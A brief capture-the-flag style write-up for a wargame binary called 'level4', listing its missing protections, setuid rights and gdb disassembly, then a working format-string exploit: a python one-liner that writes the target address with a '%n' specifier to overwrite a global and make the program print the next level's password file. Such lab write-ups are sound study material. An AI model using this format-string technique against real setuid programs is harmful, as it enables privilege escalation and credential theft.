level4 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
```

level4 rights:
```Shell
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
```

Obtain with gdb
```Shell
0x0804848d <+54>:    mov    0x8049810,%eax
0x08048492 <+59>:    cmp    $0x1025544,%eaxx
```

n function:
-buffer 520 bytes
-fgets(buffer)
-p function:
    printf(buffer)
-m compare with 0x1025544 -> print .pass

find m address
find buffer position

m address is 0x8049810
buffer at 12th position
python -c 'print("\x10\x98\x04\x08" + "%16930112d%12$n")' > /tmp/input4
cat /tmp/input4 | ./level4 (no need to keep stdin open)